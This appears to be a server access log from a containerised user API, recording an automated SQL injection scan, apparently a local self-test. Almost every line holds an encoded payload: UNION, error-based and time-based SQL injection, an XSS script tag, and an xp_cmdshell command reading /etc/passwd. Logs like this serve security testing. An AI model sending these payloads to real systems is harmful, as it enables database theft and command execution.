api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:45968 - "GET /usuarios/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/dIma HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:46008 - "POST /usuarios HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:46010 - "POST /usuarios?Cnvn=7405%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:46016 - "POST /usuarios HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:46046 - "GET /usuarios/1 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:46048 - "PUT /usuarios/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:46056 - "PUT /usuarios/1?qVke=7085%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:46058 - "PUT /usuarios/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:46080 - "GET /usuarios/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46084 - "GET /usuarios/busca/?nome=teste&ZLEl=6011%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46092 - "GET /usuarios/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46104 - "GET /usuarios/busca/?nome=3188 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46110 - "GET /usuarios/busca/?nome=teste%29..%28%29%29%22%27%28%28 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46124 - "GET /usuarios/busca/?nome=teste%27FYWhFa%3C%27%22%3EGkDXkv HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46134 - "GET /usuarios/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46152 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5184%3D6316%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27azkN%27%3D%27azkN HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46164 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6015%3D6015%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27HEco%27%3D%27HEco HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46150 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4977%3D2316%2F%2A%2A%2FAND%2F%2A%2A%2F%27jahE%27%3D%27jahE HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46180 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6015%3D6015%2F%2A%2A%2FAND%2F%2A%2A%2F%27Iouj%27%3D%27Iouj HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46190 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6487%3D3424%2F%2A%2A%2FAND%2F%2A%2A%2F%285171%3D5171 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46200 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6015%3D6015%2F%2A%2A%2FAND%2F%2A%2A%2F%288050%3D8050 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46206 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7258%3D2944 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46234 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6015%3D6015 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46240 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7780%3D7007--%2F%2A%2A%2FNMlN HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46246 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6015%3D6015--%2F%2A%2A%2FiyEf HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46256 - "GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288327%3D5096%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5096%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F8045%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46220 - "GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284768%3D4768%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F2247%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F5557%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46262 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284351%2CCONCAT%280x5c%2C0x716b627a71%2C%28SELECT%2F%2A%2A%2F%28ELT%284351%3D4351%2C1%29%29%29%2C0x716a627671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27CrTU%27%3D%27CrTU HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46264 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284351%2CCONCAT%280x5c%2C0x716b627a71%2C%28SELECT%2F%2A%2A%2F%28ELT%284351%3D4351%2C1%29%29%29%2C0x716a627671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Shou%27%3D%27Shou HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46276 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284351%2CCONCAT%280x5c%2C0x716b627a71%2C%28SELECT%2F%2A%2A%2F%28ELT%284351%3D4351%2C1%29%29%29%2C0x716a627671%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283072%3D3072 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46286 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284351%2CCONCAT%280x5c%2C0x716b627a71%2C%28SELECT%2F%2A%2A%2F%28ELT%284351%3D4351%2C1%29%29%29%2C0x716a627671%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46300 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284351%2CCONCAT%280x5c%2C0x716b627a71%2C%28SELECT%2F%2A%2A%2F%28ELT%284351%3D4351%2C1%29%29%29%2C0x716a627671%29%29--%2F%2A%2A%2FdkxP HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46314 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6415%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286415%3D6415%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ipqb%27%3D%27ipqb HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46322 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6415%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286415%3D6415%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27uqEm%27%3D%27uqEm HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46332 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6415%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286415%3D6415%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283745%3D3745 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46338 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6415%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286415%3D6415%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46348 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6415%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286415%3D6415%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2Fpqva HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46360 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3657%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283657%3D3657%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Lfvy%27%3D%27Lfvy HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46368 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F3657%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283657%3D3657%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Hhiu%27%3D%27Hhiu HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46374 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3657%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283657%3D3657%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283579%3D3579 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46378 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3657%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283657%3D3657%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46380 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3657%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283657%3D3657%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FotZL HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46384 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3788%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283788%3D3788%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27fiQD%27%3D%27fiQD HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46394 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F3788%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283788%3D3788%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27onIE%27%3D%27onIE HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46398 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3788%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283788%3D3788%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285843%3D5843 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46406 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3788%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283788%3D3788%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46388 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3788%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283788%3D3788%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FtIAd HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46422 - "GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qkbzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284135%3D4135%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjbvq%27%29%29 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46428 - "GET /usuarios/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46430 - "GET /usuarios/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46456 - "GET /usuarios/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46470 - "GET /usuarios/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46446 - "GET /usuarios/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46478 - "GET /usuarios/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46488 - "GET /usuarios/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46500 - "GET /usuarios/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46512 - "GET /usuarios/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28100%29%7C%7CCHR%2881%29%7C%7CCHR%2865%29%7C%7CCHR%2876%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46528 - "GET /usuarios/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28100%29%7C%7CCHR%2881%29%7C%7CCHR%2865%29%7C%7CCHR%2876%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46532 - "GET /usuarios/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28100%29%7C%7CCHR%2881%29%7C%7CCHR%2865%29%7C%7CCHR%2876%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46546 - "GET /usuarios/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28100%29%7C%7CCHR%2881%29%7C%7CCHR%2865%29%7C%7CCHR%2876%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46562 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3876%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29clGi%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27aYXT%27%3D%27aYXT HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46570 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3876%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29clGi%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27LOly%27%3D%27LOly HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46582 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3876%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29clGi%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285557%3D5557 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46594 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3876%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29clGi%29 HTTP/1.1" 200 OK
